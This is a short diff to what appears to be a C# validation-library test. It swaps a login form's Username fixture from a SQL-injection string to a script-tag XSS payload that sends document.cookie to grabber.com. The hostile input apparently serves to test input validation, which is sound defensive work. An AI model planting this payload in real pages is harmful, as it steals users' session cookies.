@@ -20,7 +20,7 @@ namespace Heleonix.Validation.Tests.Examples
         {
             var form = new LoginForm
             {
-                Username = "\" or \"\"=\"",
+                Username = "<script>document.location=\"https://grabber.com/?c=\"+document.cookie</script>",
                 Password = "$ecureP@ssw0rd",
             };
 
